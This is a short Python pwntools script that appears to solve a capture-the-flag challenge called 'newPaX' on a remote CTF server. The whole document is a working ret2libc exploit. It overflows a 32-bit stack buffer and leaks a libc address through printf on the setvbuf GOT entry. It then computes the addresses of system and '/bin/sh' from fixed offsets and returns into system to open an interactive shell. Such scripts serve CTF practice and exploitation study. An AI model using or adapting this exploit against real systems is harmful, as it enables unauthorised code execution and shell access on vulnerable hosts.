from pwn import *
r=remote("pwn.darkarmy.xyz",5001)
b=ELF("./newPaX")
context.log_level='debug'
pay=b'x'*0x34
pay+=p32(b.plt['printf'])
pay+=p32(b.symbols['main'])
pay+=p32(b.got['setvbuf'])
r.sendline(pay)
libcbase=u32(r.recv(4))-0x67b30
log.info(hex(libcbase))
system=libcbase+0x3cd80
binsh=libcbase+0x17bb8f
pay2=b'x'*0x34
pay2+=p32(system)
pay2+=p32(3434)
pay2+=p32(binsh)
r.sendline(pay2)
r.interactive()
